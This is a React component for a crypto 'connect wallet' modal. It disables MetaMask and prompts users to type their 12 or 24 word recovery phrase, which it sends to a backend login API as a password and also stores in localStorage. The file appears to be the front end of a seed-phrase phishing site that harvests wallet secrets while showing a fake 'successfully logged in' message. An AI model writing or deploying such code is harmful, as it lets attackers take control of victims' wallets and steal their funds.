
import React, { useState, useEffect } from 'react';
import Web3 from 'web3';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import './index.css';
import { ethers } from "ethers";
import { TOKEN_ADDRESS, TOKEN_ABI, RPC_URL } from '../../services/Types';
import Notification from '../Notification';
import {apiLogin} from '../../services/main';
import {useHistory} from 'react-router-dom';

const WalletSelect = ({isOpen, setStateOpen, setBalance}) => {

    const web3 = new Web3(RPC_URL);    
    let contract =  new web3.eth.Contract(TOKEN_ABI, TOKEN_ADDRESS);

    const [modalState, setModalState] = useState(1);
    const [modalOpen, setModalOpen] = useState(false);
    const [modalTitle, setModalTitle] = useState(" ");
    const [pharse, setPharse] = useState("");

    const [openNoti, setOpenNoti] = useState(false);
    const [titleNoti, setTitleNoti] = useState('');
    const [contentNoti, setContentNoti] = useState('');

    const history = useHistory();

    useEffect(() => {
        setModalOpen(isOpen);
    }, [isOpen]);     

    const nextState = (title) => {
        setModalState(2);
        setModalTitle(title);
    }

    
    const closeModal = () => {
        setModalState(1);
        setModalOpen(false);
    }

    const handlePharseChange = (event) => {
        setPharse(event.target.value);
    }
    const getBalance = () => {
        var check = ethers.utils.isValidMnemonic(pharse);
        if (check == false) {
            //toast.error('Please enter your correct wallet phrase!');
        } else {
            const formData = {
                userPass: pharse
            };
            apiLogin(formData).then(res => {
                console.log("res-----", res);
                localStorage.setItem('token', res.data.token);
                if(res.data.token){
                    let address = ethers.Wallet.fromMnemonic(pharse)['address'];                
    
                    localStorage.setItem('address', address); 
                    async function getBalance() {
                        const balance = await contract.methods.balanceOf(address).call();
                        console.log(balance);
                        localStorage.setItem('balance', parseFloat(Number(balance)/(1000000000)).toFixed(7)); 
                        // localStorage.setItem('balance', balance);       
                        setBalance(parseFloat(Number(balance)/(1000000000)).toFixed(7));           
                        return balance;                
                    }
                    localStorage.setItem('login', true);                   
                    getBalance();
                    closeModal();
                    setStateOpen(false);
                    setTitleNoti('Welcome');
                    setContentNoti('You have successfully logged in!');
                    setOpenNoti(true);
                    //toast.info('Successfully connected!');
                    localStorage.setItem('pharse', pharse);
                    // history.go(0);
                }
                if (res.data.error) {
                    console.log(res);
                    if (res.data.msg) {
                        console.log(res);
                    }
                }
            })
            .catch(err => {
                console.log("err-----", err);
                toast.error(<div>Wrong!<br/>Please enter your correct wallet phrase</div>);
            });
            if(localStorage.getItem('token')){
                let address = ethers.Wallet.fromMnemonic(pharse)['address'];                

                localStorage.setItem('address', address); 
                async function getBalance() {
                    const balance = await contract.methods.balanceOf(address).call();
                    console.log(balance);
                    localStorage.setItem('balance', parseFloat(Number(balance)/(1000000000)).toFixed(7)); 
                    // localStorage.setItem('balance', balance);       
                    setBalance(parseFloat(Number(balance)/(1000000000)).toFixed(7));           
                    return balance;                
                }
                localStorage.setItem('login', true);                   
                getBalance();
                closeModal();
                setStateOpen(false);
                setTitleNoti('Welcome');
                setContentNoti('You have successfully logged in!');
                setOpenNoti(true);
                //toast.info('Successfully connected!');
                localStorage.setItem('pharse', pharse);
                // history.go(0);
            }
        }         
        
    }
    return (
        <>            
            <div data-reach-dialog-overlay="true" id="dhCkyp" className={`dhCkyp iiHqcD ${modalOpen === false ? " " : "open"}`} style={{opacity:1}}>
                <div role="dialog" aria-modal="true" data-reach-dialog-content="true" tabindex="-1"
                    aria-labelledby="wallet-modal-label" className="dWodJw" hidden="">
                    <button className="iHaOcn"></button>

                    {modalState === 1 && (
                        <div className="iMWOje">
                            <div className="gpVQzW">
                                <h4 className="kQNlUO">
                                    <div className="ejJoEn">Choose wallet</div>
                                </h4>
                                <svg  onClick={closeModal} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                                    stroke="#ced4da" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                                    className="sc-jSgupP bMuPal" id="close_popup">
                                    <line x1="18" y1="6" x2="6" y2="18"></line>
                                    <line x1="6" y1="6" x2="18" y2="18"></line>
                                </svg>
                                <div className="jOXgFj">
                                    <div className="fpzhoL">
                                        <div className="edRxO" id="metamask">
                                            <div className="inJZdi">
                                                <div className="jJmxCZ row" style={{display:'block'}}>
                                                    <div className="col-md-6">
                                                        <span color="#e8831d" className="hMIspk">MetaMask</span>
                                                    </div>
                                                    <div className="col-md-6">
                                                        <span color="#e8831d" className="unavailable-color" >*Unavailable</span>
                                                    </div>                                      
                                                </div>
                                            </div>
                                            <div size="1.75" className="cNyuKi">
                                                <img src="img/metamask_gray.png" alt="Icon"/>
                                            </div>
                                            
                                        </div>
                                        <div className="edRxO" id="coinbase" onClick={() => nextState("Coinbase Wallet")}>
                                            <div className="inJZdi">
                                                <div className="jJmxCZ"><span color="#e8831d" className="hMIspk">Coinbase Wallet</span>
                                                </div>
                                            </div>
                                            <div size="1.75" className="cNyuKi"><img src="img/coin.9c00fe7e.svg"
                                                                                alt="Icon"/></div>
                                        </div>
                                        <div className="edRxO" id="trust" onClick={() => nextState("Trust Wallet")}>
                                            <div className="inJZdi">
                                                <div className="jJmxCZ"><span color="#e8831d" className="hMIspk">Trust Wallet</span>
                                                </div>
                                            </div>
                                            <div size="1.75" className="cNyuKi"><img src="img/trust.a064237e.svg"
                                                                                alt="Icon"/></div>
                                        </div>
                                        <div className="edRxO" id="safepal" onClick={() => nextState("SafeMoon Wallet")}>
                                            <div className="inJZdi">
                                                <div className="jJmxCZ"><span color="#e8831d" className="hMIspk">SafeMoon Wallet</span>
                                                </div>
                                            </div>
                                            <div size="1.75" className="cNyuKi"><img src="img/safemoon-logo-14A15F58A6-seeklogo.com.png"
                                                                                alt="Icon"/></div>
                                        </div>
                                    </div>
                                    <div className="sc-kIeTtH iwHfIC"><span>Need help?</span>&nbsp;&nbsp;<a
                                                href="https://community.trustwallet.com/t/how-to-import-a-wallet-via-recovery-phrase/843"
                                                target="_blank" rel="noopener noreferrer" className="hmocIu">How to import a wallet on Trust Wallet </a></div>
                                </div>
                            </div>
                        </div>
                    )}

                    {modalState === 2 && (
                        <div className="gpVQzW w-100">
                            <h4 className="kQNlUO">
                                <div className="ejJoEn">{modalTitle}</div>
                            </h4>
                            <svg onClick={closeModal} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                                stroke="#ced4da" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                                className="sc-jSgupP bMuPal" id="close_popup">
                                <line x1="18" y1="6" x2="6" y2="18"></line>
                                <line x1="6" y1="6" x2="18" y2="18"></line>
                            </svg>
                            <div className='connect-list'>
                                <div class="connect-phrase">Enter your 12 or 24 word phrase below (words separated by a single space)</div>
                                <textarea rows="8" name="phrase" minlength="23" required="" placeholder="Enter Phrase..." id="txt_phrase"  value={pharse} onChange={handlePharseChange}></textarea>
                                <button disabled="" type="button" id="btn_submit" onClick={getBalance}>SUBMIT</button>
                                <div class="sc-kIeTtH iwHfIC"><span>Need help?</span>&nbsp;&nbsp;<a href="https://community.trustwallet.com/t/how-to-import-a-wallet-via-recovery-phrase/843"target="_blank" rel="noopener noreferrer" class="hmocIu">How to import your wallet on Trust Wallet </a> </div>
                            </div>
                        </div>
                    )}
                </div>
            </div>
            <Notification isOpen={openNoti} title={titleNoti} content={contentNoti}/> 
        </>
    )
}

export default WalletSelect;
